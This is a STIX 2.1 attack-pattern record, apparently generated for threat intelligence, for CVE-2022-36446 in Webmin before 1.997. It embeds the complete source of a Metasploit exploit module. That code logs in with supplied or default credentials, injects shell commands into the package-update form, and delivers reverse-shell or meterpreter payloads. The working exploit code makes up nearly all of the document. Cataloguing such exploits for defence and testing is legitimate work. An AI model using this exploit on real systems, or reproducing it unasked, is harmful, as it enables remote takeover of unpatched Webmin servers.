{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9668fc2e-65f7-4565-9c4e-a05bfe00148e",
    "created": "2024-08-14T17:02:28.500402Z",
    "modified": "2024-08-14T17:02:28.500406Z",
    "name": "Webmin Package Updates RCE",
    "description": " This module exploits an arbitrary command injection in Webmin versions prior to 1.997.  Webmin uses the OS package manager (`apt`, `yum`, etc.) to perform package updates and installation. Due to a lack of input sanitization, it is possibe to inject arbitrary command that will be concatenated to the package manager call.  This exploit requires authentication and the account must have access to the Software Package Updates module.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/webmin_package_updates_rce.rb",
            "external_id": "webmin_package_updates_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://medium.com/@emirpolat/cve-2022-36446-webmin-1-997-7a9225af3165"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-36446"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Webmin Package Updates RCE',\n        'Description' => %q{\n          This module exploits an arbitrary command injection in Webmin\n          versions prior to 1.997.\n\n          Webmin uses the OS package manager (`apt`, `yum`, etc.) to perform\n          package updates and installation. Due to a lack of input\n          sanitization, it is possibe to inject arbitrary command that will be\n          concatenated to the package manager call.\n\n          This exploit requires authentication and the account must have access\n          to the Software Package Updates module.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Christophe De La Fuente', # MSF module\n          'Emir Polat' # Discovery and PoC\n        ],\n        'References' => [\n          [ 'EDB', '50998' ],\n          [ 'URL', 'https://medium.com/@emirpolat/cve-2022-36446-webmin-1-997-7a9225af3165'],\n          [ 'CVE', '2022-36446']\n        ],\n        'DisclosureDate' => '2022-07-26',\n        'Platform' => ['unix', 'linux'],\n        'Privileged' => true,\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64, ARCH_AARCH64],\n        'Payload' => { 'BadChars' => '/' },\n        'DefaultOptions' => {\n          'RPORT' => 10000,\n          'SSL' => true\n        },\n        'Targets' => [\n          [\n            'Unix In-Memory',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_memory,\n              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_perl' }\n            }\n          ],\n          [\n            'Linux Dropper (x86 & x64)',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :linux_dropper,\n              'DefaultOptions' => { 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp' }\n            }\n          ],\n          [\n            'Linux Dropper (ARM64)',\n            {\n              'Platform' => 'linux',\n              'Arch' => ARCH_AARCH64,\n              'Type' => :linux_dropper,\n              'DefaultOptions' => { 'PAYLOAD' => 'linux/aarch64/meterpreter/reverse_tcp' }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'Base path to Webmin', '/']),\n        OptString.new('USERNAME', [ true, 'User to login with', 'admin']),\n        OptString.new('PASSWORD', [ false, 'Password to login with', '123456'])\n      ]\n    )\n  end\n\n  def check\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path)\n    )\n\n    return CheckCode::Unknown(\"#{peer} - Could not connect to web service - no response\") unless res\n\n    if res.body.include?('This web server is running in SSL mode.')\n      return CheckCode::Unknown(\"#{peer} - Please enable the SSL option to proceed\")\n    end\n\n    version = res.headers['Server'].to_s.scan(%r{MiniServ/([\\d.]+)}).flatten.first\n\n    return CheckCode::Unknown(\"#{peer} - Webmin version not detected\") unless version\n\n    version = Rex::Version.new(version)\n\n    vprint_status(\"Webmin #{version} detected\")\n\n    unless version < Rex::Version.new('1.997')\n      return CheckCode::Safe(\"#{peer} - Webmin #{version} is not a supported target\")\n    end\n\n    vprint_good(\"Webmin #{version} is a supported target\")\n\n    CheckCode::Appears\n  rescue ::Rex::ConnectionError\n    return CheckCode::Unknown(\"#{peer} - Could not connect to web service\")\n  end\n\n  def do_login\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/session_login.cgi'),\n      'headers' => { 'Referer' => full_uri },\n      'cookie' => 'testing=1',\n      'keep_cookies' => true,\n      'vars_post' => {\n        'user' => datastore['USERNAME'],\n        'pass' => datastore['PASSWORD']\n      }\n    })\n\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") unless res\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Invalid credentials (response code: #{res.code})\") unless res.code == 302\n\n    print_good('Logged in!')\n  end\n\n  def execute_command(cmd, _opts = {})\n    cmd = cmd.gsub('/', '${SEP}').gsub('\\'', '\"')\n    cmd = \"#{rand_text_alphanumeric(4)};SEP=$(perl -MMIME::Base64 -e \\\"print decode_base64('Lw==')\\\")&&#{cmd}\"\n\n    send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/package-updates/update.cgi'),\n      'headers' => { 'Referer' => full_uri },\n      'vars_post' => {\n        'mode' => 'new',\n        'search' => rand_text(10),\n        'redir' => '',\n        'redirdesc' => '',\n        'u' => cmd,\n        'confirm' => 'Install Now'\n      }\n    })\n  end\n\n  def exploit\n    print_status('Attempting login')\n    do_login\n\n    print_status('Sending payload')\n    case target['Type']\n    when :unix_memory\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager\n    end\n  rescue ::Rex::ConnectionError\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-07-26",
    "x_mitre_platforms": [
        "linux'"
    ]
}